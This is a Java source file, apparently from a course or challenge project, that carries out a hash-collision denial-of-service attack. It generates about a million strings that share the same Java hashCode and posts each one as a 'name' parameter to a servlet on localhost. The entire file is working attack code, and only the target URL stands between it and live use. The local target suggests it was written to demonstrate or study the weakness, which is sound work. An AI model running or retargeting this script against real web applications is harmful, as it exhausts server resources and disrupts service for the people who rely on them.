package ch.hsr.challp.neo2;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;

public class Hacker {

    private static final String[] basestring = new String[4];
    static {
        basestring[0] = "q~";
        basestring[1] = "r_";
        basestring[2] = "s@";
        basestring[3] = "t!";
    }

    public static void main(String[] args) throws Exception {
        // will produce 4^stringlength collisons. so 10 will produce 1'048'576
        // collisions
        int stringlength = 10;
        URL server = new URL(
                "http://localhost:8080/HashCollisionWeb/HashCollisionServlet");

        // generate the list of collisions first and do not send them
        // immediately after producing them, it only takes about 2-3 seconds for
        // a million but still…
        List<String> collisions = generateCombinations(stringlength, basestring);
        for (String s : collisions) {
            HttpURLConnection conn = (HttpURLConnection) server
                    .openConnection();
            conn.setDoOutput(true);

            String parameter = "name=" + s;
            conn.setRequestProperty("Content-Length",
                    "" + Integer.toString(parameter.getBytes().length));
            conn.setUseCaches(false);

            OutputStreamWriter writer = new OutputStreamWriter(
                    conn.getOutputStream());
            writer.write(parameter);
            writer.flush();
            writer.close();

            BufferedReader reader = new BufferedReader(new InputStreamReader(
                    conn.getInputStream()));

            reader.close();
            conn.disconnect();
        }
    }

    private static final List<String> generateCombinations(int arraySize,
            String[] possibleValues) {
        // use an itertive method and not a recursive one since it uses too much
        // memory
        List<String> collisions = new ArrayList<String>(((int) Math.pow(4,
                arraySize) + 1));

        int carry;
        int[] indices = new int[arraySize];
        do {
            StringBuilder sb = new StringBuilder(arraySize);
            for (int index : indices) {
                sb.append(possibleValues[index]);
            }
            collisions.add(sb.toString());

            carry = 1;
            for (int i = indices.length - 1; i >= 0; i--) {
                if (carry == 0) {
                    break;
                }

                indices[i] += carry;
                carry = 0;

                if (indices[i] == possibleValues.length) {
                    carry = 1;
                    indices[i] = 0;
                }
            }
        }
        while (carry != 1);
        return collisions;
    }
}